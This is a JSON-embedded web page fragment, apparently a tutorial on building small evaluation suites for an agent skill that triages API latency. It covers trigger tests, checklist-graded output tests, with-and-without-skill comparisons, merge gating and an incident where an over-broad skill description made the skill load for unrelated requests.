class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"python evals/run.py --skill triage-api-latency --version HEAD --out results/head.json\npython evals/compare.py results/main.json results/head.json --fail-on-regression\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">python evals/run.py --skill triage-api-latency --version HEAD --out results/head.json\npython evals/compare.py results/main.json results/head.json --fail-on-regression\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Fail the merge on any regression in the must or must-not checks. Add a test every time a real failure is found, so the suite grows from experience.\u003c/p>\n\u003ch2 id=\"incident-a-description-edit-that-triggered-everywhere\">Incident: A description edit that triggered everywhere\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A small wording change made a skill load for unrelated requests.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">prompt: &quot;Write a SQL query for monthly revenue&quot;\u003c/span>\u003cspan class=\"ln out\">skill loaded: triage-api-latency\u003c/span>\u003cspan class=\"ln out\">expected: no skill\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Someone broadened the description to include performance in general. The skill then loaded for many unrelated requests. A negative trigger test failed in review and the description was narrowed again.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Only testing prompts that should trigger\u003c/li>\n\u003cli>Grading outputs by feel\u003c/li>\n\u003cli>Not comparing against no skill\u003c/li>\n\u003cli>Fixing failures without adding tests\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"trigger-tests","text":"Trigger tests"},{"id":"output-tests","text":"Output tests"},{"id":"compare-and-gate","text":"Compare and gate"},{"id":"incident-a-description-edit-that-triggered-everywhere","text":"Incident: A description edit that triggered everywhere"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Anthropic Agent Skills overview","u":"https://docs.anthropic.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"Anthropic: define success and build evaluations","u":"https://docs.anthropic.com/en/docs/test-and-evaluate/develop-tests"}],"text":"Changing one line in a skill can change when it triggers or how it behaves. Without tests you will not know. A small evaluation set makes changes safe and shows whether the skill adds value. What you will learn Trigger tests: should and should not use the skill Output tests with clear grading Comparing with and without the skill Gating changes on results Trigger tests # evals/triggers.yaml should_trigger: - \"The checkout API p99 jumped after the deploy, help me triage\" - \"Latency is high on the orders service in prod\" should_not_trigger: - \"Write a SQL query for monthly revenue\" - \"Explain what a Kubernetes pod is\" A good description triggers on the first group and stays quiet on the second. Include near misses, such as a database problem when the skill covers only API services. Output tests # evals/tasks.yaml - id: latency-after-deploy prompt: \"p99 doubled after the 14:10 deploy of checkout. Triage.\" must: - checks rollout history before proposing a change - uses read-only commands only - asks approval before rollback must_not: - runs kubectl rollout restart Grade with a checklist, either by a person or by a model with a clear rubric you spot-check. Keep the rubric short, specific and tied to the skill&#39;s rules. Compare and gate Run each task with and without the skill, and between the old and new version. Record pass rate, tokens and time. python evals/run.py --skill triage-api-latency --version HEAD --out results/head.json python evals/compare.py results/main.json results/head.json --fail-on-regression Fail the merge on any regression in the must or must-not checks. Add a test every time a real failure is found, so the suite grows from experience. Incident: A description edit that triggered everywhere Incident A small wording change made a skill load for unrelated requests. prompt: \"Write a SQL query for monthly revenue\" skill loaded: triage-api-latency expected: no skill Someone broadened the description to include performance in general. The skill then loaded for many unrelated requests. A negative trigger test failed in review and the description was narrowed again. Common mistakes Only testing prompts that should trigger Grading outputs by feel Not comparing against no skill Fixing failures without adding tests"}});